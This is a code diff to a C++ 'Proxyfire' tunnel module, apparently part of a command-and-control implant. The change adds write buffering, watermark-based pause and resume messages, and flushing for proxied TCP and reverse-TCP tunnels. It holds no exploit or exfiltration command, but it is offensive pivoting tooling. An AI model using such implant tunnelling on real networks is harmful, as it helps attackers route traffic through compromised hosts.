@@ -19,6 +19,12 @@ void PackProxyStatus(Packer* packer, ULONG channelId, ULONG commandId, ULONG typ
 	packer->Pack32(result);
 }
 
+void PackProxyControl(Packer* packer, ULONG channelId, ULONG commandId)
+{
+	packer->Pack32(channelId);
+	packer->Pack32(commandId);
+}
+
 void PackProxyData(Packer* packer, ULONG channelId, BYTE* data, ULONG dataSize )
 {
 	packer->Pack32(channelId);
@@ -30,14 +36,18 @@ void Proxyfire::AddProxyData(ULONG channelId, ULONG type, SOCKET sock, ULONG wai
 {
 	TunnelData tunnelData = { 0 };
 	tunnelData.channelID = channelId;
-	tunnelData.type      = type;
-	tunnelData.sock      = sock;
-	tunnelData.waitTime  = waitTime;
-	tunnelData.mode      = mode;
-	tunnelData.state     = state;
-	tunnelData.i_address = address;
-	tunnelData.port      = port;
-	tunnelData.startTick = ApiWin->GetTickCount();
+	tunnelData.type            = type;
+	tunnelData.sock            = sock;
+	tunnelData.waitTime        = waitTime;
+	tunnelData.mode            = mode;
+	tunnelData.state           = state;
+	tunnelData.i_address       = address;
+	tunnelData.port            = port;
+	tunnelData.startTick       = ApiWin->GetTickCount();
+	tunnelData.writeBuffer     = NULL;
+	tunnelData.writeBufferSize = 0;
+	tunnelData.paused          = FALSE;
+	tunnelData.server_paused   = FALSE;
 	this->tunnels.push_back(tunnelData);
 }
 
@@ -180,33 +190,105 @@ void Proxyfire::ConnectMessageUDP(ULONG channelId, CHAR* address, WORD port, Pac
 	}
 }
 
-void Proxyfire::ConnectWriteTCP(ULONG channelId, CHAR* data, ULONG dataSize)
+void Proxyfire::ConnectWriteTCP(ULONG channelId, CHAR* data, ULONG dataSize, Packer* outPacker)
 {
+	if (data == NULL || dataSize == 0)
+		return;
+
 	TunnelData* tunnelData;
 	for (int i = 0; i < tunnels.size(); i++) {
 		tunnelData = &(this->tunnels[i]);
-		if (tunnelData->channelID == channelId && tunnelData->state == TUNNEL_STATE_READY) {
-			DWORD finishTick = ApiWin->GetTickCount() + 30000;
-			timeval timeout = { 0, 100 };
-			fd_set exceptfds;
-			fd_set writefds;
-			
-			while (ApiWin->GetTickCount() < finishTick) {
-				writefds.fd_array[0] = tunnelData->sock;
-				writefds.fd_count = 1;
-				exceptfds.fd_array[0] = writefds.fd_array[0];
-				exceptfds.fd_count = 1;
-				ApiWin->select(0, 0, &writefds, &exceptfds, &timeout);
-				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds))
-					break;
-				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
-					if (ApiWin->send(tunnelData->sock, data, dataSize, 0) != -1 || ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)
-						return;
-					ApiWin->Sleep(1000);
-				}
+
+		if (tunnelData->channelID != channelId || tunnelData->state != TUNNEL_STATE_READY)
+			continue;
+
+		if (tunnelData->writeBuffer != NULL && tunnelData->writeBufferSize > 0) {
+
+			if (tunnelData->writeBufferSize + dataSize > TUNNEL_BUFFER_HARD_CAP) {
+				ApiWin->closesocket(tunnelData->sock);
+				tunnelData->state = TUNNEL_STATE_CLOSE;
+
+				MemFreeLocal((LPVOID*) & tunnelData->writeBuffer, tunnelData->writeBufferSize);
+				tunnelData->writeBuffer = NULL;
+				tunnelData->writeBufferSize = 0;
+
+				if (outPacker)
+					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_CLOSE, 0, WSAENOBUFS);
+				return;
 			}
-			break;
+
+			CHAR* newBuf = (CHAR*)MemReallocLocal(tunnelData->writeBuffer, tunnelData->writeBufferSize + dataSize);
+			if (newBuf == NULL) {
+				ApiWin->closesocket(tunnelData->sock);
+				tunnelData->state = TUNNEL_STATE_CLOSE;
+
+				MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
+				tunnelData->writeBuffer = NULL;
+				tunnelData->writeBufferSize = 0;
+
+				if (outPacker)
+					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_CLOSE, 0, WSAENOBUFS);
+				return;
+			}
+
+			tunnelData->writeBuffer = newBuf;
+			memcpy(tunnelData->writeBuffer + tunnelData->writeBufferSize, data, dataSize);
+			tunnelData->writeBufferSize += dataSize;
+
+			if (outPacker && tunnelData->writeBufferSize > TUNNEL_BUFFER_HIGH_WATERMARK && !tunnelData->paused) {
+				tunnelData->paused = TRUE;
+				PackProxyControl(outPacker, channelId, COMMAND_TUNNEL_PAUSE);
+			}
+			return;
 		}
+
+		int sent = ApiWin->send(tunnelData->sock, data, (int)dataSize, 0);
+		if (sent == -1) {
+			int err = ApiWin->WSAGetLastError();
+			if (err == WSAEWOULDBLOCK) {
+				sent = 0;
+			}
+			else {
+				ApiWin->closesocket(tunnelData->sock);
+				tunnelData->state = TUNNEL_STATE_CLOSE;
+
+				if (outPacker)
+					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_CLOSE, 0, err);
+				return;
+			}
+		}
+
+		if (sent < (int)dataSize) {
+			ULONG remain = dataSize - (ULONG)sent;
+
+			if (remain > TUNNEL_BUFFER_HARD_CAP) {
+				ApiWin->closesocket(tunnelData->sock);
+				tunnelData->state = TUNNEL_STATE_CLOSE;
+
+				if (outPacker)
+					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_CLOSE, 0, WSAENOBUFS);
+				return;
+			}
+
+			tunnelData->writeBuffer = (CHAR*)MemAllocLocal(remain);
+			if (tunnelData->writeBuffer == NULL) {
+				ApiWin->closesocket(tunnelData->sock);
+				tunnelData->state = TUNNEL_STATE_CLOSE;
+
+				if (outPacker)
+					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_CLOSE, 0, WSAENOBUFS);
+				return;
+			}
+
+			memcpy(tunnelData->writeBuffer, data + sent, remain);
+			tunnelData->writeBufferSize = remain;
+
+			if (outPacker && tunnelData->writeBufferSize > TUNNEL_BUFFER_HIGH_WATERMARK && !tunnelData->paused) {
+				tunnelData->paused = TRUE;
+				PackProxyControl(outPacker, channelId, COMMAND_TUNNEL_PAUSE);
+			}
+		}
+		return;
 	}
 	tunnelData = NULL;
 }
@@ -242,6 +324,28 @@ void Proxyfire::ConnectWriteUDP(ULONG channelId, CHAR* data, ULONG dataSize)
 		}
 	}
 	tunnelData = NULL;
+}
+
+void Proxyfire::ConnectPause(ULONG channelId)
+{
+	for (int i = 0; i < tunnels.size(); i++) {
+		TunnelData* t = &(tunnels[i]);
+		if (t->channelID == channelId) {
+			t->server_paused = TRUE;
+			return;
+		}
+	}
+}
+
+void Proxyfire::ConnectResume(ULONG channelId)
+{
+	for (int i = 0; i < tunnels.size(); i++) {
+		TunnelData* t = &(tunnels[i]);
+		if (t->channelID == channelId) {
+			t->server_paused = FALSE;
+			return;
+		}
+	}
 }
 
 void Proxyfire::ConnectClose(ULONG channelId)
@@ -376,11 +480,19 @@ ULONG Proxyfire::RecvProxy(Packer* packer)
 	LPVOID buffer = MemAllocLocal(0x10000);
 	TunnelData* tunnelData;
 	for (int i = 0; i < this->tunnels.size(); i++) {
-		// Limit total data per tick to prevent blocking heartbeat (~4MB)
+
 		if (packer->datasize() > 0x400000)
 			break;
+
 		tunnelData = &(this->tunnels[i]);
 		if (tunnelData->state == TUNNEL_STATE_READY) {
+
+			if (tunnelData->server_paused)
+				continue;
+
+			if (tunnelData->writeBufferSize > TUNNEL_BUFFER_HIGH_WATERMARK)
+				continue;
+
 			if (tunnelData->mode == TUNNEL_MODE_SEND_UDP) {
 
 				LPVOID buffer = MemAllocLocal(0xFFFFC);
@@ -420,7 +532,7 @@ ULONG Proxyfire::RecvProxy(Packer* packer)
 							tunnelData->state = TUNNEL_STATE_CLOSE;
 							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
 						}
-						break; // WOULDBLOCK or Error, stop reading this tunnel for now
+						break;
 					}
 				}
 			}
@@ -429,6 +541,91 @@ ULONG Proxyfire::RecvProxy(Packer* packer)
 	MemFreeLocal(&buffer, 0x10000);
 	tunnelData = NULL;
 	return count;
+}
+
+void Proxyfire::FlushProxy(Packer* packer)
+{
+	TunnelData* tunnelData;
+
+	timeval timeout;
+	timeout.tv_sec = 0;
+	timeout.tv_usec = 0;
+
+	for (int i = 0; i < this->tunnels.size(); i++) {
+		tunnelData = &(this->tunnels[i]);
+
+		if (tunnelData->state != TUNNEL_STATE_READY)
+			continue;
+
+		if (tunnelData->writeBuffer == NULL || tunnelData->writeBufferSize == 0)
+			continue;
+
+		fd_set writefds;
+		FD_ZERO(&writefds);
+		FD_SET(tunnelData->sock, &writefds);
+
+		int sel = ApiWin->select(0, NULL, &writefds, NULL, &timeout);
+		if (sel <= 0 || !ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds))
+			continue;
+
+		int sent = ApiWin->send(tunnelData->sock, tunnelData->writeBuffer, (int)tunnelData->writeBufferSize, 0);
+		if (sent > 0) {
+			if ((ULONG)sent >= tunnelData->writeBufferSize) {
+				MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
+				tunnelData->writeBuffer = NULL;
+				tunnelData->writeBufferSize = 0;
+				if (packer && tunnelData->paused) {
+					tunnelData->paused = FALSE;
+					PackProxyControl(packer, tunnelData->channelID, COMMAND_TUNNEL_RESUME);
+				}
+			}
+			else {
+				ULONG remain = tunnelData->writeBufferSize - (ULONG)sent;
+
+				CHAR* newBuf = (CHAR*)MemAllocLocal(remain);
+				if (newBuf == NULL) {
+					MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
+					tunnelData->writeBuffer = NULL;
+					tunnelData->writeBufferSize = 0;
+
+					ApiWin->closesocket(tunnelData->sock);
+					tunnelData->state = TUNNEL_STATE_CLOSE;
+
+					if (packer)
+						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_CLOSE, 0, WSAENOBUFS);
+					continue;
+				}
+
+				memcpy(newBuf, tunnelData->writeBuffer + sent, remain);
+				MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
+
+				tunnelData->writeBuffer = newBuf;
+				tunnelData->writeBufferSize = remain;
+				if (packer && tunnelData->paused && tunnelData->writeBufferSize < TUNNEL_BUFFER_LOW_WATERMARK) {
+					tunnelData->paused = FALSE;
+					PackProxyControl(packer, tunnelData->channelID, COMMAND_TUNNEL_RESUME);
+				}
+			}
+		}
+		else if (sent == -1) {
+			int err = ApiWin->WSAGetLastError();
+			if (err != WSAEWOULDBLOCK) {
+				if (tunnelData->writeBuffer) {
+					MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
+					tunnelData->writeBuffer = NULL;
+					tunnelData->writeBufferSize = 0;
+				}
+
+				ApiWin->closesocket(tunnelData->sock);
+				tunnelData->state = TUNNEL_STATE_CLOSE;
+
+				if (packer)
+					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_CLOSE, 0, err);
+			}
+		}
+	}
+
+	tunnelData = NULL;
 }
 
 void Proxyfire::CloseProxy()
@@ -450,6 +647,12 @@ void Proxyfire::CloseProxy()
 				if (ApiWin->closesocket(tunnelData->sock) && tunnelData->mode == TUNNEL_MODE_REVERSE_TCP)
 					continue;
 
+				if (tunnelData->writeBuffer) {
+					MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
+					tunnelData->writeBuffer = NULL;
+					tunnelData->writeBufferSize = 0;
+				}
+
 				this->tunnels.remove(i);
 				--i;
 			}
@@ -464,6 +667,7 @@ void Proxyfire::ProcessTunnels(Packer* packer)
 		return;
 
 	this->CheckProxy(packer);
+	this->FlushProxy(packer);
 
 	ULONG finishTick = ApiWin->GetTickCount() + 2500;
 	while ( this->RecvProxy(packer) && ApiWin->GetTickCount() < finishTick );
